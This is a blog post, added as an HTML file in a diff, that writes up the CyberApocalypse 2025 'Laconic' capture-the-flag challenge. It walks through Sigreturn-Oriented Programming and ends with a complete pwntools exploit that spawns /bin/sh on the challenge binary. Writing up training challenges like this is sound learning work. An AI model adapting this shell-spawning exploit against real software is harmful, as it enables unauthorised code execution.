@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>CyberApocalypse 2025 - Laconic</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CyberApocalypse 2025 - Laconic | c0derpwner BlogSpot</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="CyberApocalypse 2025 - Laconic" />
+<meta name="author" content="c0derpwnergit remote add origin" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Using Sigreturn-Oriented Programming (SROP)" />
+<meta property="og:description" content="Using Sigreturn-Oriented Programming (SROP)" />
+<link rel="canonical" href="http://localhost:4000/Laconic" />
+<meta property="og:url" content="http://localhost:4000/Laconic" />
+<meta property="og:site_name" content="c0derpwner BlogSpot" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-04-28T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CyberApocalypse 2025 - Laconic" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"c0derpwnergit remote add origin","url":"https://ashishchaudhary.in/hacker-blog"},"dateModified":"2025-04-28T00:00:00+02:00","datePublished":"2025-04-28T00:00:00+02:00","description":"Using Sigreturn-Oriented Programming (SROP)","headline":"CyberApocalypse 2025 - Laconic","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Laconic"},"url":"http://localhost:4000/Laconic"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>c0derpwner@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>CyberApocalypse 2025 - Laconic</h2>
+  <time datetime="2025-04-28T00:00:00+02:00" class="by-line">28 Apr 2025</time>
+  <h3 id="using-sigreturn-oriented-programming-srop">Using Sigreturn-Oriented Programming (SROP)</h3>
+
+<p>It was decompiled trought ghidra as you can see there’s</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span>   <span class="n">undefined</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span>    <span class="n">byte</span><span class="p">;</span>
+<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">int</span>    <span class="n">dword</span><span class="p">;</span>
+<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">long</span>    <span class="n">qword</span><span class="p">;</span>
+<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">short</span>    <span class="n">word</span><span class="p">;</span>
+<span class="k">typedef</span> <span class="k">enum</span> <span class="n">Elf_ProgramHeaderType</span> <span class="p">{</span>
+    <span class="n">PT_NULL</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+    <span class="n">PT_LOAD</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+    <span class="n">PT_DYNAMIC</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>
+    <span class="n">PT_INTERP</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span>
+    <span class="n">PT_NOTE</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span>
+    <span class="n">PT_SHLIB</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span>
+    <span class="n">PT_PHDR</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span>
+    <span class="n">PT_TLS</span><span class="o">=</span><span class="mi">7</span><span class="p">,</span>
+    <span class="n">PT_GNU_EH_FRAME</span><span class="o">=</span><span class="mi">1685382480</span><span class="p">,</span>
+    <span class="n">PT_GNU_STACK</span><span class="o">=</span><span class="mi">1685382481</span><span class="p">,</span>
+    <span class="n">PT_GNU_RELRO</span><span class="o">=</span><span class="mi">1685382482</span>
+<span class="p">}</span> <span class="n">Elf_ProgramHeaderType</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">Elf64_Phdr</span> <span class="n">Elf64_Phdr</span><span class="p">,</span> <span class="o">*</span><span class="n">PElf64_Phdr</span><span class="p">;</span>
+
+<span class="k">struct</span> <span class="n">Elf64_Phdr</span> <span class="p">{</span>
+    <span class="k">enum</span> <span class="n">Elf_ProgramHeaderType</span> <span class="n">p_type</span><span class="p">;</span>
+    <span class="n">dword</span> <span class="n">p_flags</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">p_offset</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">p_vaddr</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">p_paddr</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">p_filesz</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">p_memsz</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">p_align</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">Elf64_Sym</span> <span class="n">Elf64_Sym</span><span class="p">,</span> <span class="o">*</span><span class="n">PElf64_Sym</span><span class="p">;</span>
+
+<span class="k">struct</span> <span class="n">Elf64_Sym</span> <span class="p">{</span>
+    <span class="n">dword</span> <span class="n">st_name</span><span class="p">;</span>
+    <span class="n">byte</span> <span class="n">st_info</span><span class="p">;</span>
+    <span class="n">byte</span> <span class="n">st_other</span><span class="p">;</span>
+    <span class="n">word</span> <span class="n">st_shndx</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">st_value</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">st_size</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">Elf64_Shdr</span> <span class="n">Elf64_Shdr</span><span class="p">,</span> <span class="o">*</span><span class="n">PElf64_Shdr</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">enum</span> <span class="n">Elf_SectionHeaderType</span> <span class="p">{</span>
+    <span class="n">SHT_NULL</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+    <span class="n">SHT_PROGBITS</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+    <span class="n">SHT_SYMTAB</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>
+    <span class="n">SHT_STRTAB</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span>
+    <span class="n">SHT_RELA</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span>
+    <span class="n">SHT_HASH</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span>
+    <span class="n">SHT_DYNAMIC</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span>
+    <span class="n">SHT_NOTE</span><span class="o">=</span><span class="mi">7</span><span class="p">,</span>
+    <span class="n">SHT_NOBITS</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span>
+    <span class="n">SHT_REL</span><span class="o">=</span><span class="mi">9</span><span class="p">,</span>
+    <span class="n">SHT_SHLIB</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
+    <span class="n">SHT_DYNSYM</span><span class="o">=</span><span class="mi">11</span><span class="p">,</span>
+    <span class="n">SHT_INIT_ARRAY</span><span class="o">=</span><span class="mi">14</span><span class="p">,</span>
+    <span class="n">SHT_FINI_ARRAY</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span>
+    <span class="n">SHT_PREINIT_ARRAY</span><span class="o">=</span><span class="mi">16</span><span class="p">,</span>
+    <span class="n">SHT_GROUP</span><span class="o">=</span><span class="mi">17</span><span class="p">,</span>
+    <span class="n">SHT_SYMTAB_SHNDX</span><span class="o">=</span><span class="mi">18</span><span class="p">,</span>
+    <span class="n">SHT_ANDROID_REL</span><span class="o">=</span><span class="mi">1610612737</span><span class="p">,</span>
+    <span class="n">SHT_ANDROID_RELA</span><span class="o">=</span><span class="mi">1610612738</span><span class="p">,</span>
+    <span class="n">SHT_GNU_ATTRIBUTES</span><span class="o">=</span><span class="mi">1879048181</span><span class="p">,</span>
+    <span class="n">SHT_GNU_HASH</span><span class="o">=</span><span class="mi">1879048182</span><span class="p">,</span>
+    <span class="n">SHT_GNU_LIBLIST</span><span class="o">=</span><span class="mi">1879048183</span><span class="p">,</span>
+    <span class="n">SHT_CHECKSUM</span><span class="o">=</span><span class="mi">1879048184</span><span class="p">,</span>
+    <span class="n">SHT_SUNW_move</span><span class="o">=</span><span class="mi">1879048186</span><span class="p">,</span>
+    <span class="n">SHT_SUNW_COMDAT</span><span class="o">=</span><span class="mi">1879048187</span><span class="p">,</span>
+    <span class="n">SHT_SUNW_syminfo</span><span class="o">=</span><span class="mi">1879048188</span><span class="p">,</span>
+    <span class="n">SHT_GNU_verdef</span><span class="o">=</span><span class="mi">1879048189</span><span class="p">,</span>
+    <span class="n">SHT_GNU_verneed</span><span class="o">=</span><span class="mi">1879048190</span><span class="p">,</span>
+    <span class="n">SHT_GNU_versym</span><span class="o">=</span><span class="mi">1879048191</span>
+<span class="p">}</span> <span class="n">Elf_SectionHeaderType</span><span class="p">;</span>
+
+<span class="k">struct</span> <span class="n">Elf64_Shdr</span> <span class="p">{</span>
+    <span class="n">dword</span> <span class="n">sh_name</span><span class="p">;</span>
+    <span class="k">enum</span> <span class="n">Elf_SectionHeaderType</span> <span class="n">sh_type</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">sh_flags</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">sh_addr</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">sh_offset</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">sh_size</span><span class="p">;</span>
+    <span class="n">dword</span> <span class="n">sh_link</span><span class="p">;</span>
+    <span class="n">dword</span> <span class="n">sh_info</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">sh_addralign</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">sh_entsize</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">Elf64_Ehdr</span> <span class="n">Elf64_Ehdr</span><span class="p">,</span> <span class="o">*</span><span class="n">PElf64_Ehdr</span><span class="p">;</span>
+
+<span class="k">struct</span> <span class="n">Elf64_Ehdr</span> <span class="p">{</span>
+    <span class="n">byte</span> <span class="n">e_ident_magic_num</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">e_ident_magic_str</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+    <span class="n">byte</span> <span class="n">e_ident_class</span><span class="p">;</span>
+    <span class="n">byte</span> <span class="n">e_ident_data</span><span class="p">;</span>
+    <span class="n">byte</span> <span class="n">e_ident_version</span><span class="p">;</span>
+    <span class="n">byte</span> <span class="n">e_ident_osabi</span><span class="p">;</span>
+    <span class="n">byte</span> <span class="n">e_ident_abiversion</span><span class="p">;</span>
+    <span class="n">byte</span> <span class="n">e_ident_pad</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
+    <span class="n">word</span> <span class="n">e_type</span><span class="p">;</span>
+    <span class="n">word</span> <span class="n">e_machine</span><span class="p">;</span>
+    <span class="n">dword</span> <span class="n">e_version</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">e_entry</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">e_phoff</span><span class="p">;</span>
+    <span class="n">qword</span> <span class="n">e_shoff</span><span class="p">;</span>
+    <span class="n">dword</span> <span class="n">e_flags</span><span class="p">;</span>
+    <span class="n">word</span> <span class="n">e_ehsize</span><span class="p">;</span>
+    <span class="n">word</span> <span class="n">e_phentsize</span><span class="p">;</span>
+    <span class="n">word</span> <span class="n">e_phnum</span><span class="p">;</span>
+    <span class="n">word</span> <span class="n">e_shentsize</span><span class="p">;</span>
+    <span class="n">word</span> <span class="n">e_shnum</span><span class="p">;</span>
+    <span class="n">word</span> <span class="n">e_shstrndx</span><span class="p">;</span>
+<span class="p">};</span>
+
+
+
+
+<span class="kt">void</span> <span class="n">processEntry</span> <span class="nf">entry</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">syscall</span><span class="p">();</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>First let’s plonk down the available gadgets and their location, as well as the location of /bin/sh</p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>From here, I suggest you try the payload yourself. The padding (as you can see in the assembly) is 8 bytes until RIP, then you’ll need to trigger a sigreturn, followed by the values of the registers. The triggering of a sigreturn is easy - sigreturn is syscall 0xf (15), so we just pop that into RAX and call syscall:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xf</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">SYSCALL_RET</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now the syscall looks at the location of RSP for the register values; we’ll have to fake them. They have to be in a specific order, but luckily for us pwntools has a cool feature called a SigreturnFrame() that handles the order for us.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">frame</span> <span class="o">=</span> <span class="nc">SigreturnFrame</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Now we just need to decide what the register values should be. We want to trigger an execve() syscall, so we’ll set the registers to the values we need for that:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frame.rax = 0x3b            # syscall number for execve
+frame.rdi = BINSH           # pointer to /bin/sh
+frame.rsi = 0x0             # NULL
+frame.rdx = 0x0             # NULL
+</code></pre></div></div>
+
+<p>However, in order to trigger this we also have to control RIP and point it back at the syscall gadget, so the execve actually executes:</p>
+
+<p><code class="language-plaintext highlighter-rouge">frame.rip = SYSCALL_RET</code></p>
+
+<p>We then append it to the payload and send :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">+=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="final-exploit">Final Exploit</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./laconic</span><span class="sh">'</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">()</span>
+
+<span class="n">BINSH</span> <span class="o">=</span> <span class="mh">0x43238</span>  <span class="c1"># Address of '/bin/sh' found in the binary
+</span><span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x43018</span>
+<span class="n">SYSCALL_RET</span> <span class="o">=</span> <span class="mh">0x43015</span>
+
+<span class="n">frame</span> <span class="o">=</span> <span class="nc">SigreturnFrame</span><span class="p">()</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0x3b</span>            <span class="c1"># syscall number for execve
+</span><span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">BINSH</span>           <span class="c1"># pointer to /bin/sh
+</span><span class="n">frame</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x0</span>             <span class="c1"># NULL
+</span><span class="n">frame</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x0</span>             <span class="c1"># NULL
+</span><span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">SYSCALL_RET</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xf</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">SYSCALL_RET</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>c0derpwner</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
